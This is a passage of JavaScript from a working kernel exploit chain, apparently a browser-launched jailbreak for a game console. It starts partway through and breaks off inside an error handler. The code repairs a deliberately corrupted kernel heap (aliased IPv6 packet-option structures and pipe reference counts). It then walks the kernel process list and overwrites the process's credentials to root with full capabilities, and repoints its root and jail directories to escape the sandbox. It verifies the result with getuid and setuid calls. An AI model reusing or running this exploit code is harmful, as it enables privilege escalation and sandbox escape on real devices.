                                        for (let bump = 1; bump <= 4; ++bump) {
                                            await breathe();
                                            kview(fp).setInt32(FILE_F_COUNT,
                                                before + bump, true);
                                            await breathe();
                                            after = kview(fp).getInt32(FILE_F_COUNT, true);
                                            if (after > before && after >= 2) break;
                                        }
                                        return { before: before, after: after };
                                    }

                                    function getIn6pOutputopts(fd) {
                                        const fp = fget(fd);
                                        if (!kptr(fp)) return null;
                                        const fData = kview(fp).getBInt(0, true);
                                        if (!kptr(fData)) return null;
                                        const soPcb = kview(fData).getBInt(0x18, true);
                                        if (!kptr(soPcb)) return null;
                                        const o = kview(soPcb).getBInt(0x118, true);
                                        return kptr(o) ? o : null;
                                    }

                                    /* Each of these is a chain of flush()es; the
                                       event loop has to turn between them or the
                                       whole repair walk is one synchronous
                                       stretch. */
                                    await breathe();
                                    const optsA = getIn6pOutputopts(pktoptsTwins[0]);
                                    await breathe();
                                    const optsB = getIn6pOutputopts(pktoptsTwins[1]);
                                    const fdC = twinSocks.length ? twinSocks[0] : -1;
                                    await breathe();
                                    const optsC = fdC > 0 ? getIn6pOutputopts(fdC) : null;
                                    await breathe();
                                    const pktinfoA = optsA
                                        ? kview(optsA).getBInt(PKTOPTS_PKTINFO, true) : null;
                                    await breathe();
                                    const rthdrB = optsB
                                        ? kview(optsB).getBInt(PKTOPTS_RTHDR, true) : null;
                                    await breathe();
                                    const rthdrC = optsC
                                        ? kview(optsC).getBInt(PKTOPTS_RTHDR, true) : null;

                                    mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
                                        + " in6p_outputopts=" + (optsA || "null")
                                        + "   want " + reqs1Aligned);
                                    mark("REPAIR-WALK", "fd " + pktoptsTwins[1]
                                        + " ip6po_rthdr=" + (rthdrB || "null")
                                        + "   want " + reqs1Aligned);
                                    mark("REPAIR-WALK", "fd " + fdC
                                        + " ip6po_rthdr=" + (rthdrC || "null")
                                        + "   want " + reqs2Addr);
                                    mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
                                        + " ip6po_pktinfo=" + (pktinfoA || "null")
                                        + "   want " + pipeM.add32(8)
                                        + " (master's pipebuf.out)");

                                    const walkA = !!optsA && sameI64(optsA, reqs1Aligned);
                                    const walkB = !!rthdrB && sameI64(rthdrB, reqs1Aligned);
                                    const walkC = !!rthdrC && sameI64(rthdrC, reqs2Addr);
                                    const walkP = !!pktinfoA && sameI64(pktinfoA, pipeM.add32(8));
                                    check("socket-walk-lands-chunk-stage"
                                        + "leaked, from both owners", walkA && walkB,
                                        walkA && walkB ? "in6p_outputopts and the twin's "
                                            + "ip6po_rthdr are the same allocation, and it "
                                            + "is the one the aio_entry named"
                                            : "walkA=" + walkA + " walkB=" + walkB);
                                    check("0x80-chunk-second-owner-where"
                                        + "said it is", walkC,
                                        walkC ? "" : "twinSocks[0]=" + fdC
                                            + " rthdr=" + (rthdrC || "null"));
                                    check("ip6po_pktinfo-points-master-pipebuf",
                                        walkP, walkP ? "" : "so this is not the pktopts "
                                            + "the pipe primitive was built on");

                                    await breathe();
                                    kview(reqs1Aligned).setBInt(8, 0, true);

                                    await breathe();
                                    const chunkX = alloc(0x100);
                                    chunkX.u8.fill(0);
                                    const auditN = kv.kread(chunkX.addr, reqs1Aligned, 0x100);
                                    const dirtyWords = [];
                                    for (let o = 8; o < 0x100; o += 8) {
                                        if (o === PKTOPTS_PKTINFO) continue;
                                        if (o === PKTOPTS_TCLASS) continue;
                                        const lo = chunkX.dv.getUint32(o, true) >>> 0;
                                        const hi = chunkX.dv.getUint32(o + 4, true) >>> 0;
                                        if (lo || hi) dirtyWords.push("+0x" + o.toString(16)
                                            + "=" + new int64(lo, hi));
                                    }
                                    mark("REPAIR-AUDIT", auditN + " bytes of the aliased "
                                        + "pktopts read back; head "
                                        + hexBytes(chunkX.u8.subarray(0, 16))
                                        + "   tclass=" + hx(chunkX.dv.getUint32(PKTOPTS_TCLASS, true))
                                        + "   non-zero elsewhere: "
                                        + (dirtyWords.length ? dirtyWords.join(" ") : "none"));
                                    const auditOk = auditN === 0x100 && dirtyWords.length === 0;
                                    check("nothing-ip6_clearpktopts-will-free"
                                        + "chunk is a pointer", auditOk,
                                        auditOk ? "every word zero except the rthdr header, "
                                            + "ip6po_pktinfo and ip6po_tclass"
                                            : "a non-zero word here becomes a free() of "
                                            + "whatever it points at");

                                    const canRepair = walkA && walkB && walkC && walkP
                                        && auditOk;
                                    if (!canRepair) {
                                        mark("REPAIR-REFUSED", "the repair was NOT "
                                            + "attempted. Nothing was written and nothing "
                                            + "will be closed -- an unverified repair is "
                                            + "worse than none, because it turns a known "
                                            + "reboot into an unknown one.");
                                    } else {

                                        const pipeFds = [masterPipe[0], masterPipe[1],
                                        slavePipe[0], slavePipe[1]];
                                        const expectFp = [pipeMFp, null, pipeSFp, null];
                                        let held = 0;
                                        const holdLog = [];
                                        for (let i = 0; i < pipeFds.length; ++i) {
                                            const fp = fget(pipeFds[i]);
                                            if (!kptr(fp)) {
                                                holdLog.push(pipeFds[i] + ":fp=" + fp);
                                                continue;
                                            }
                                            if (expectFp[i] && !sameI64(fp, expectFp[i])) {
                                                holdLog.push(pipeFds[i] + ":fp=" + fp
                                                    + " != " + expectFp[i]);
                                                continue;
                                            }
                                            await breathe();
                                            const probe = kview(fp).getInt32(FILE_F_COUNT, true);
                                            if (!(probe >= 1 && probe <= 16)) {
                                                holdLog.push(pipeFds[i] + ":f_count=" + probe
                                                    + " implausible");
                                                continue;
                                            }
                                            /* fhold is async (it breathes);
                                               awaiting it keeps the loop's
                                               synchronous stretch bounded. */
                                            const h = await fhold(fp);
                                            holdLog.push(pipeFds[i] + ":" + h.before
                                                + "->" + h.after);

                                            if (h.after > h.before && h.after >= 2) held++;
                                        }
                                        mark("PIPE-REFCNT", holdLog.join("  "));
                                        check("four-pipe-files-hold"
                                            + "reference", held === 4,
                                            held + "/4 -- without this, closing the master "
                                            + "pipe kmem_frees slave's struct pipe, and "
                                            + "closing the slave frees whatever address its "
                                            + "pipebuf last pointed at");

                                        const masterOne = holdLog.slice(0, 2).every(
                                            function (s) { return /:1->/.test(s); });
                                        check("f_count-read-1-master-fds"
                                            + "what one fd and no other holder gives",
                                            masterOne, masterOne
                                            ? "so 0x28 is f_count. The slave pair reads "
                                            + "high because kv's own read(slave[0]) and "
                                            + "write(slave[1]) hold it while they work."
                                            : holdLog.join(" ") + " -- if these are not "
                                            + "small reference counts, 0x28 is the wrong "
                                            + "field and the hold is corrupting "
                                            + "something else");

                                        /*
                                        WATCHDOG FIX. This block is where the
                                        "page isn't responding" popup fired: the
                                        screenshot's last line is the REPAIR-AUDIT
                                        check above, and the next thing that runs
                                        is nine consecutive flush()es (four
                                        setBInt, four getBInt, then the 0x100
                                        kread below) -- each flush is 3 ROP
                                        syscalls, i.e. 27 in one unbroken
                                        synchronous stretch, with no breathe().
                                        Yield around each one.
                                        */
                                        await breathe();
                                        kview(optsA).setBInt(PKTOPTS_PKTINFO, 0, true);

                                        await breathe();
                                        kview(optsA).setBInt(PKTOPTS_M, 0, true);
                                        await breathe();
                                        kview(optsB).setBInt(PKTOPTS_RTHDR, 0, true);
                                        await breathe();
                                        kview(optsC).setBInt(PKTOPTS_RTHDR, 0, true);

                                        await breathe();
                                        const backA = kview(optsA).getBInt(PKTOPTS_PKTINFO, true);
                                        await breathe();
                                        const backM = kview(optsA).getBInt(PKTOPTS_M, true);
                                        await breathe();
                                        const backB = kview(optsB).getBInt(PKTOPTS_RTHDR, true);
                                        await breathe();
                                        const backC = kview(optsC).getBInt(PKTOPTS_RTHDR, true);
                                        const zeroed = function (v) {
                                            return !!v && v.low === 0 && v.hi === 0;
                                        };
                                        mark("REPAIR-WRITE", "ip6po_pktinfo=" + backA
                                            + " ip6po_m=" + backM
                                            + " twin rthdr=" + backB
                                            + " 0x80 rthdr=" + backC);
                                        const cleared = zeroed(backA) && zeroed(backM)
                                            && zeroed(backB) && zeroed(backC);
                                        check("second-owner-reads-null"
                                            + "pointer", cleared,
                                            cleared ? "chunk X is freed once, by fd "
                                                + pktoptsTwins[0] + "; chunk Y is freed by "
                                                + "nobody and leaks 0x80 bytes"
                                                : "at least one pointer did not clear");

                                        await breathe();
                                        chunkX.u8.fill(0);
                                        kv.kread(chunkX.addr, reqs1Aligned, 0x100);
                                        let leftover = 0;
                                        for (let o = 0; o < 0x100; o += 8) {
                                            if (o === PKTOPTS_TCLASS) continue;
                                            if ((chunkX.dv.getUint32(o, true) >>> 0)
                                                || (chunkX.dv.getUint32(o + 4, true) >>> 0))
                                                leftover++;
                                        }
                                        check("aliased-pktopts-entirely-zero"
                                            + "except its tclass", leftover === 0,
                                            leftover + " non-zero word(s) left -- head "
                                            + hexBytes(chunkX.u8.subarray(0, 16)));

                                        repaired = held === 4 && cleared && leftover === 0;
                                        mark(repaired ? "REPAIR-DONE" : "REPAIR-PARTIAL",
                                            repaired
                                                ? "every doubly-owned allocation now has "
                                                + "exactly one owner. cleanup() is "
                                                + "unlocked."
                                                : "the teardown stays locked; the reboot "
                                                + "banner is still correct.");
                                        if (repaired) {
                                            pipeFdsHeld = pipeFds.slice();

                                            kvProbe = function () {
                                                const w = kview(evfCv).getBInt(0, true);
                                                let s = "";
                                                for (let i = 0; i < 8; ++i) {
                                                    const c = kv.view.dv.getUint8(i);
                                                    if (!c) break;
                                                    s += String.fromCharCode(c);
                                                }
                                                return { word: w, str: s };
                                            };
                                        }
                                    }

                                    if (!repaired) {
                                        mark("JAILBREAK-SKIPPED", "the repair did not "
                                            + "verify, so this run is already going to "
                                            + "ask for a reboot. Doing more kernel "
                                            + "writes on top of that is how a clean "
                                            + "failure becomes a panic.");
                                    } else try {
                                        state("stage 8: jailbreak...", "warn");

                                        const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
                                        const P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
                                        const CR_UID = 0x04, CR_RUID = 0x08, CR_SVUID = 0x0c;
                                        const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                                        const CR_PRISON = 0x30;
                                        const CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                                        const FD_RDIR = 0x10, FD_JDIR = 0x18;
                                        const KERNEL_PID = 0;

                                        let walk = curproc, steps = 0, allproc = null;
                                        while (steps < 4096) {
                                            /* WATCHDOG FIX: up to 4096 flushes in one
                                               synchronous stretch without this. */
                                            await breathe();
                                            if (isImageAddr(walk)) { allproc = walk; break; }
                                            if (!kptr(walk)) break;
                                            walk = kview(walk).getBInt(P_LIST_PREV, true);
                                            steps++;
                                        }
                                        mark("ALLPROC", (allproc || "NOT FOUND")
                                            + "   after " + steps + " le_prev step(s) "
                                            + "back from " + curproc
                                            + (allproc && kbase ? "   = kernel_base + 0x"
                                                + (allproc.low - kbase.low >>> 0).toString(16)
                                                : ""));
                                        check("allproc-reached-by-walking-p_list"
                                            + "backwards", !!allproc,
                                            allproc ? "it is a kernel image address, "
                                                + "which is what &allproc must be"
                                                : "the walk left the proc list");

                                        const procs = [];
                                        /*
                                        WATCHDOG FIX. pfind walks the proc list
                                        with TWO flush()es per iteration (one
                                        getInt32 for p_pid, one getBInt for
                                        p_list.le_next) for up to 4096
                                        iterations -- and it is called twice, so
                                        as much as 16k flushes sat in one
                                        synchronous stretch. That is the stage-8
                                        "page isn't responding" popup. Made async
                                        so it can breathe inside the loop; both
                                        call sites await it.
                                        */
                                        async function pfind(pid) {
                                            if (!allproc) return null;
                                            let p2 = kview(allproc).getBInt(0, true);
                                            for (let n = 0; n < 4096; ++n) {
                                                /* BREATHE every 32 steps, not
                                                   twice per step: each turn is
                                                   a ~4 ms macrotask, and the
                                                   proc list is only ~30 long,
                                                   so the old cadence spent
                                                   ~250 ms per pfind call doing
                                                   nothing. */
                                                if ((n & 0x1f) === 0x1f) await breathe();
                                                if (!p2 || !kptr(p2)) return null;
                                                const q = kview(p2).getInt32(P_PID, true);
                                                if (n < 8) procs.push(q);
                                                if (q === pid) return p2;
                                                p2 = kview(p2).getBInt(P_LIST_NEXT, true);
                                                if (!p2 || p2.low === 0 && p2.hi === 0)
                                                    return null;
                                            }
                                            return null;
                                        }
                                        const selfProc = await pfind(myPid);
                                        const kProc = await pfind(KERNEL_PID);
                                        mark("PFIND", "pid " + myPid + " -> "
                                            + (selfProc || "null") + "   pid 0 -> "
                                            + (kProc || "null")
                                            + "   first pids on the list: " + procs.slice(0, 8));
                                        check("pfind-found-proc"
                                            + "one the sigio named",
                                            !!selfProc && sameI64(selfProc, curproc),
                                            selfProc ? selfProc + " vs " + curproc
                                                : "not found -- allproc or p_pid is wrong");
                                        check("pfind-found-kernel-proc-pid",
                                            !!kProc && kptr(kProc),
                                            kProc ? kProc.toString() : "not found");

                                        if (selfProc && sameI64(selfProc, curproc) && kProc) {

                                            const uidBefore = sc(SYS.getuid).i32;
                                            const setuidBefore = sc(SYS.setuid, 0).i32;
                                            const uidAfterTry = sc(SYS.getuid).i32;
                                            mark("PRE-JAILBREAK", "getuid=" + uidBefore
                                                + "  setuid(0)=" + setuidBefore
                                                + "  getuid=" + uidAfterTry);
                                            check("process-unprivileged-before"
                                                + "the patch", uidBefore !== 0
                                            && setuidBefore === -1,
                                                "uid " + uidBefore + ", setuid(0) refused "
                                                + "-- exactly the test main.js:109 uses "
                                                + "to decide whether to jailbreak");

                                            const pathBuf = alloc(0x40);
                                            function tryOpen(path) {
                                                pathBuf.u8.fill(0);
                                                for (let i = 0; i < path.length; ++i)
                                                    pathBuf.u8[i] = path.charCodeAt(i);
                                                const fd = sc(SYS.open, pathBuf.addr, 0, 0).i32;
                                                if (fd >= 0) sc(SYS.close, fd);
                                                return fd;
                                            }
                                            const PROBE_PATHS = ["/", "/system",
                                                "/mini-syscore.elf", "/system_ex"];
                                            const before = PROBE_PATHS.map(function (s) {
                                                return s + "=" + tryOpen(s);
                                            });
                                            mark("SANDBOX-BEFORE", before.join("  "));

                                            /*
                                            prison0 AND rootvnode COME FROM kbase + OFFSET.

                                            The reference (lapse-vue.js:1634-1638) does:

                                                var prison0 = kernel.read_qword(
                                                    kernel.addr.base.add(kernel_offset.PRISON0));
                                                var rootvnode = kernel.read_qword(
                                                    kernel.addr.base.add(kernel_offset.ROOTVNODE));

                                            i.e. two KNOWN offsets off the kernel image -- not
                                            kProc->p_ucred->cr_prison and kProc->p_fd->fd_rdir.
                                            The old walk here depended on the kernel proc's
                                            p_ucred and p_fd being individually sane, and the
                                            live runs showed they were not: rootVnode and kProc
                                            repeatedly came back as junk (hi=0xffff with a
                                            mismatched low half, 17 hex digits) while pUcred
                                            read fine. That is a lot of fragile structure to
                                            trust for two constants.

                                            kbase is already recovered in stage 6 (OFF-KSTR,
                                            verified with an ELF header check), and the offsets
                                            are in offset.js, cross-checked against the same
                                            vue-kernel table k_evf_cv / k_sysent_661 /
                                            k_jmp_rsi came from.

                                            kProc is still used for the FALLBACK, and
                                            pUcred/pFdb still come from selfProc -- those two
                                            are what the writes actually target and they must
                                            belong to THIS process.
                                            */
                                            const pUcred = kview(selfProc).getBInt(P_UCRED, true);
                                            const pFdb = kview(selfProc).getBInt(P_FD, true);

                                            let prison0 = null, prisonFrom = "none";
                                            if (kbase && off.k_prison0 !== undefined) {
                                                prison0 = kread8(kbase.add32(off.k_prison0));
                                                prisonFrom = "kbase+0x"
                                                    + off.k_prison0.toString(16);
                                            }
                                            if (!(prison0 && kptr(prison0))) {
                                                const kUcred = kview(kProc)
                                                    .getBInt(P_UCRED, true);
                                                prison0 = kview(kUcred)
                                                    .getBInt(CR_PRISON, true);
                                                prisonFrom = "fallback kProc->p_ucred->cr_prison";
                                            }

                                            let rootVnode = null, rootFrom = "none";
                                            if (kbase && off.k_rootvnode !== undefined) {
                                                rootVnode = kread8(kbase.add32(off.k_rootvnode));
                                                rootFrom = "kbase+0x"
                                                    + off.k_rootvnode.toString(16);
                                            }
                                            if (!(rootVnode && kptr(rootVnode))) {
                                                const kFdb = kview(kProc)
                                                    .getBInt(P_FD, true);
                                                rootVnode = kview(kFdb)
                                                    .getBInt(FD_RDIR, true);
                                                rootFrom = "fallback kProc->p_fd->fd_rdir";
                                            }

                                            mark("JAILBREAK-SOURCES", "p_ucred=" + pUcred
                                                + " p_fd=" + pFdb
                                                + " prison0=" + prison0 + " (" + prisonFrom + ")"
                                                + " root_vnode=" + rootVnode + " (" + rootFrom + ")");
                                            /*
                                            Every one of these next to its hi/lo half, so a
                                            value that is really two words concatenated (the
                                            "17 hex digit" look) or a misread low word is
                                            unambiguous in the log. hx() on the halves cannot
                                            produce more than 8 digits each.
                                            */
                                            mark("SRC-HALVES",
                                                "ucred=" + hx(pUcred ? pUcred.low : 0) + ":"
                                                + hx(pUcred ? pUcred.hi : 0)
                                                + "  pfd=" + hx(pFdb ? pFdb.low : 0) + ":"
                                                + hx(pFdb ? pFdb.hi : 0)
                                                + "  prison0=" + hx(prison0 ? prison0.low : 0) + ":"
                                                + hx(prison0 ? prison0.hi : 0)
                                                + "  rootvnode=" + hx(rootVnode ? rootVnode.low : 0) + ":"
                                                + hx(rootVnode ? rootVnode.hi : 0));
                                            /*
                                            SOURCE VALIDATION.

                                            kptr() only tests the HIGH WORD (>= 0xffff0000),
                                            so a MISREAD pointer with a valid high word and a
                                            garbage low word passes it. A corrupt
                                            root_vnode that still clears kptr() is then
                                            written into fd_rdir/fd_jdir, and the kernel
                                            faults on the next vnode touch -- with the ROP
                                            pivot held, a hard hang.

                                            Add the tests the reference uses before it
                                            trusts a pointer:

                                              - 8-byte ALIGNMENT on every address we will
                                                dereference or write through (isKernelPtr's
                                                low-word test alone does not do this).
                                              - for rootVnode, that it is NOT inside the same
                                                0x1000 page as pUcred/pFdb -- a struct proc
                                                and a vnode are different allocations, and a
                                                root_vnode that landed in the proc page is a
                                                misread, not a vnode.

                                            Anything that fails is refused here, as a log
                                            line, instead of faulting in the kernel.
                                            */
                                            const isAligned = function (v) {
                                                return !!v && ((v.low >>> 0) & 7) === 0;
                                            };
                                            const srcPtrOk = kptr(pUcred) && isAligned(pUcred)
                                                && isAligned(pFdb) && kptr(prison0);
                                            const samePage = function (a, b) {
                                                return !!a && !!b
                                                    && (a.hi >>> 0) === (b.hi >>> 0)
                                                    && (((a.low >>> 0) ^ (b.low >>> 0)) & ~0xfff) === 0;
                                            };
                                            const rootVnodeOk = kptr(rootVnode)
                                                && isAligned(rootVnode)
                                                && !samePage(rootVnode, pFdb)
                                                && !samePage(rootVnode, pUcred);
                                            /* kUcred is gone: prison0 no longer comes
                                               from kProc->p_ucred, so there is no
                                               kernel-proc ucred to validate. This gate
                                               is now exactly the addresses we will
                                               WRITE THROUGH -- pUcred and pFdb -- plus
                                               the two values we will STORE. */
                                            const srcOk = srcPtrOk && rootVnodeOk
                                                && !!(pUcred && pFdb && prison0 && rootVnode);
                                            mark("SRC-CHECK", "pUcred aligned=" + isAligned(pUcred)
                                                + " pFdb aligned=" + isAligned(pFdb)
                                                + " rootVnode aligned=" + isAligned(rootVnode)
                                                + " rootVnode-same-page-as-pfd="
                                                + samePage(rootVnode, pFdb)
                                                + " rootVnode-same-page-as-ucred="
                                                + samePage(rootVnode, pUcred));
                                            /*
                                            Name the individual gates and the final
                                            value, so the PROOF line and the
                                            components can never disagree in the log
                                            again -- one earlier run showed SRC-CHECK
                                            with rootVnode aligned=false while the
                                            check still reported OK, which is
                                            impossible unless the two were printed
                                            from different code.
                                            */
                                            mark("SRC-GATES", "kptrUcred=" + kptr(pUcred)
                                                + " alUcred=" + isAligned(pUcred)
                                                + " kptrPrison0=" + kptr(prison0)
                                                + " alPrison0=" + isAligned(prison0)
                                                + " kptrPfd=" + kptr(pFdb)
                                                + " alPfd=" + isAligned(pFdb)
                                                + " kptrRootVnode=" + kptr(rootVnode)
                                                + " alRootVnode=" + isAligned(rootVnode)
                                                + " rootVnodeOk=" + rootVnodeOk
                                                + " srcPtrOk=" + srcPtrOk
                                                + " SRC_OK=" + srcOk);
                                            check("structure-jailbreak-writes"
                                                + "through is a kernel pointer", srcOk,
                                                srcOk ? "" : "refusing to write (see SRC-CHECK/SRC-GATES)");
                                            if (!srcOk) {
                                                state("jailbreak sources bad -- "
                                                    + "skipping the ucred write", "bad");
                                            }

                                            if (srcOk) {
                                                /*
                                                WATCHDOG FIX + FIELD-SET FIX.

                                                This block used to write THREE
                                                fields that neither working
                                                reference writes:

                                                  CR_SVGID     0x18
                                                  CR_SCEAUTHID 0x58
                                                  CR_SCEATTR0  0x83  (a BYTE, and
                                                                      UNALIGNED)

                                                lapse-vue.js:1628-1640 writes only
                                                cr_uid/cr_ruid/cr_svuid/
                                                cr_ngroups/cr_rgid, cr_prison,
                                                sceCaps[0]/sceCaps[1] and
                                                fd_rdir/fd_jdir; netctrl-vue.js
                                                defines SYSCORE_AUTHID but never
                                                stores it into a ucred here.

                                                The 0x83 byte write is the one that
                                                hangs: kview(pUcred).setUint8(0x83,
                                                0x80) -> kwrite(pUcred+0x83, .., 1),
                                                which forges the pipebuf's buffer
                                                to an ODD, unaligned kernel address.
                                                The kernel's pipe write then walks
                                                a misaligned record and faults with
                                                the ROP pivot held -- a hard hang at
                                                the FIRST ucred write, which is
                                                exactly where "stage 8: jailbreak..."
                                                stops in the log. uid=0 does not
                                                need any of the three fields; the
                                                reference proves that on hardware.

                                                Also: 9 writes + 4 read-backs is
                                                still a long synchronous stretch, so
                                                breathe() between the two halves.
                                                */
                                                await breathe();

                                                /*
                                                KV LIVENESS + AIM PROBE.

                                                Stage 7 proved kv works, but that was
                                                several hundred kernel ops ago and the
                                                pipe primitive depends on the forged
                                                pipebuf still describing a live pipe.
                                                If it has since gone bad, the FIRST
                                                write below PARKES the kernel inside
                                                flush() -- no throw, no popback, just a
                                                dead "stage 8: jailbreak..." page.

                                                So read the word we are about to write,
                                                and read a known-good anchor (evfCv, the
                                                "evf cv" string stage 7 verified). If
                                                either read fails, kv is dead and we
                                                refuse here instead of faulting.

                                                Note we only read: a read that cannot
                                                park is the cheap, safe probe.
                                                */
                                                let kvAlive = false;
                                                try {
                                                    const probe = kview(evfCv).getBInt(0, true);
                                                    kvAlive = !!probe;
                                                } catch (e) {
                                                    mark("KV-PROBE-THREW",
                                                        (e && e.message) ? e.message : String(e));
                                                    kvAlive = false;
                                                }
                                                const uidReg = kvAlive
                                                    ? kview(pUcred).getInt32(CR_UID, true) : null;
                                                mark("KV-PRE-WRITE", "kv alive=" + kvAlive
                                                    + " p_ucred+0x04 reads " + uidReg
                                                    + (uidReg !== null
                                                        ? "  (about to become 0)" : ""));
                                                if (!kvAlive) {
                                                    mark("JAILBREAK-REFUSED",
                                                        "the pipe primitive did not answer a "
                                                        + "read at the ucred stage, so every "
                                                        + "write below would block the kernel "
                                                        + "with the pivot held. Nothing is "
                                                        + "written; this run already owed a "
                                                        + "reboot.");
                                                    throw new Error("jailbreak: kv is dead "
                                                        + "before the ucred write");
                                                }

                                                /*
                                                WRITES GO THROUGH PKTINFO, NOT THE PIPE.

                                                These ten fields were written with kview(...)
                                                .setInt32/.setBInt -- the pipe primitive -- and
                                                that write is what has parked the kernel at this
                                                exact point across several runs. The reads
                                                through the same pipe work fine (KV-PRE-WRITE
                                                just proved it); it is the WRITE side that
                                                stalls.

                                                netctrl does these same ucred writes and does
                                                not stall, and the difference is the mechanism:
                                                netctrl writes via ip6po_pktinfo
                                                (kwrite20/ipv6_kwrite). Stage 5 in THIS file
                                                already proves that path works here -- it wrote
                                                KWRITE-AIM / arbitrary-kernel-address-took-20
                                                with exactly the aim -> verify -> write shape
                                                used below, on every run.

                                                So: same fields, same offsets, same values, just
                                                the mechanism that is known to complete. Each
                                                field is an independent aim-verified write, so
                                                a miss refuses that ONE field and reports it
                                                instead of freezing the page.

                                                pktinfoSet copies its 0x14-byte buffer to the
                                                aimed address, and offset 8 of that buffer must
                                                stay `pktinfoSelf` (ip6po_pktinfo points at
                                                itself) or the primitive is lost after one use.
                                                Every write below therefore touches only bytes
                                                [0,8) -- one 8-byte field, or one 4-byte field
                                                at offset 0 or 4.
                                                */
                                                /*
                                                THESE GO THROUGH kv (KernelView), NOT pktinfo.

                                                The pktinfo versions were tried and they MISS.
                                                The reason is stage 7: the alias repair
                                                deliberately zeroes ip6po_pktinfo on optsA
                                                    kview(optsA).setBInt(PKTOPTS_PKTINFO, 0, true)

                                                and stage 4's FASTRW-WRITE repoints the master
                                                pipebuf at pipeS. Between them that dismantles
                                                the pktinfo primitive that stage 5 relied on, so
                                                setsockopt(IPV6_PKTINFO) at stage 8 aims at 0 and
                                                silently writes nowhere. The live run confirms
                                                it: POST-JAILBREAK getuid=1 setuid(0)=-1 -- the
                                                write simply did not land.

                                                kv IS alive here. The same run logged
                                                KV-FLUSH-DONE flushes=263 and kv=up at STAGE-5-
                                                DONE, and stage 7 verified the pipebuf with
                                                KV-RW64 / kernel-word-written-through-pipes. And
                                                flush() is now the plain netctrl shape (write
                                                then read, no pre-drain), which is what netctrl
                                                uses for these exact ucred writes without an
                                                incident. So kview is both the available and the
                                                proven mechanism at this point in the chain.

                                                Each field still verifies its read-back, so a
                                                miss reports per field instead of parking.
                                                */
                                                function kvWrite32(dst, value) {
                                                    try {
                                                        kview(dst).setInt32(0, value, true);
                                                    } catch (e) {
                                                        return false;
                                                    }
                                                    const now = kread8(dst);
                                                    return !!now && now.low === (value >>> 0);
                                                }
                                                function kvWrite64(dst, value) {
                                                    const v = (typeof value === "number")
                                                        ? new int64(value >>> 0,
                                                            value < 0 ? 0xffff : 0)
                                                        : value;
                                                    try {
                                                        kview(dst).setBInt(0, v, true);
                                                    } catch (e) {
                                                        return false;
                                                    }
                                                    const now = kread8(dst);
                                                    return !!now && sameI64(now, v);
                                                }

                                                const writes = [];
                                                writes.push(["cr_uid", kvWrite32(
                                                    pUcred.add32(CR_UID), 0)]);
                                                await breathe();
                                                writes.push(["cr_ruid", kvWrite32(
                                                    pUcred.add32(CR_RUID), 0)]);
                                                writes.push(["cr_svuid", kvWrite32(
                                                    pUcred.add32(CR_SVUID), 0)]);
                                                writes.push(["cr_ngroups", kvWrite32(
                                                    pUcred.add32(CR_NGROUPS), 1)]);
                                                writes.push(["cr_rgid", kvWrite32(
                                                    pUcred.add32(CR_RGID), 0)]);
                                                await breathe();
                                                writes.push(["cr_prison", kvWrite64(
                                                    pUcred.add32(CR_PRISON), prison0)]);
                                                writes.push(["sceCaps1", kvWrite64(
                                                    pUcred.add32(CR_SCECAPS1), new int64(0xffff, 0xffff))]);
                                                writes.push(["sceCaps0", kvWrite64(
                                                    pUcred.add32(CR_SCECAPS0), new int64(0xffff, 0xffff))]);
                                                await breathe();
                                                writes.push(["fd_rdir", kvWrite64(
                                                    pFdb.add32(FD_RDIR), rootVnode)]);
                                                writes.push(["fd_jdir", kvWrite64(
                                                    pFdb.add32(FD_JDIR), rootVnode)]);
                                                const failedFields = writes.filter(
                                                    function (w) { return !w[1]; });
                                                mark("JB-KV-WRITES", writes.map(function (w) {
                                                    return w[0] + "=" + (w[1] ? "ok" : "MISS");
                                                }).join(" "));
                                                if (failedFields.length) {
                                                    mark("JB-KV-WRITE-MISS",
                                                        failedFields.map(function (w) { return w[0]; })
                                                            .join(",") + " -- those fields did not "
                                                        + "read back, so uid=0 is partial. The write "
                                                        + "did not park (flush() is the netctrl "
                                                        + "shape), it simply did not take.");
                                                }

                                                await breathe();
                                                const back = {
                                                    uid: kread8(pUcred.add32(CR_UID))
                                                        ? kread8(pUcred.add32(CR_UID)).low : null,
                                                    ngroups: kread8(pUcred.add32(CR_NGROUPS))
                                                        ? kread8(pUcred.add32(CR_NGROUPS)).low : null,
                                                    prison: kread8(pUcred.add32(CR_PRISON)),
                                                    caps: kread8(pUcred.add32(CR_SCECAPS0)),
                                                    rdir: kread8(pFdb.add32(FD_RDIR)),
                                                    jdir: kread8(pFdb.add32(FD_JDIR))
                                                };
                                                mark("JAILBREAK-WRITE", "cr_uid=" + back.uid
                                                    + " cr_ngroups=" + back.ngroups
                                                    + " cr_prison=" + back.prison
                                                    + " cr_sceCaps[0]=" + back.caps
                                                    + " fd_rdir=" + back.rdir
                                                    + " fd_jdir=" + back.jdir);
                                                const capsAll = back.caps
                                                    && back.caps.low === 0xffff
                                                    && back.caps.hi === 0xffff;
                                                check("ucred-reads-patched",
                                                    back.uid === 0
                                                    && back.ngroups === 1
                                                    && sameI64(back.prison, prison0)
                                                    && capsAll
                                                    && sameI64(back.rdir, rootVnode)
                                                    && sameI64(back.jdir, rootVnode), "");

                                                const uidNow = sc(SYS.getuid).i32;
                                                const euidNow = sc(SYS.geteuid).i32;
                                                const setuidNow = sc(SYS.setuid, 0).i32;
                                                mark("POST-JAILBREAK", "getuid=" + uidNow
                                                    + " geteuid=" + euidNow
                                                    + " setuid(0)=" + setuidNow);
                                                const rooted = uidNow === 0 && setuidNow === 0;
                                                check("kernel-reports-root",
                                                    rooted, rooted
                                                    ? "getuid() went " + uidBefore
                                                    + " -> 0 and setuid(0) went -1 -> 0, "
                                                    + "neither of which userland can fake"
                                                    : "uid " + uidNow);

                                                const after = PROBE_PATHS.map(function (s) {
                                                    return s + "=" + tryOpen(s);
                                                });
                                                mark("SANDBOX-AFTER", after.join("  "));
                                                const escaped = PROBE_PATHS.some(function (s, i) {
                                                    return before[i].endsWith("=-1")
                                                        && !after[i].endsWith("=-1");
                                                });
                                                check("path-unreachable-before"
                                                    + "opens now", escaped,
                                                    escaped ? "fd_rdir/fd_jdir now point at "
                                                        + "the kernel's root vnode"
                                                        : "no probe path changed -- the app "
                                                        + "sandbox may already have allowed "
                                                        + "all of them, so this proves "
                                                        + "nothing either way");
                                                jailbroken = rooted;
                                            }
                                        }
                                    } catch (e) {
                                        mark("JAILBREAK-THREW", (e && e.message)
                                            ? e.message : String(e));
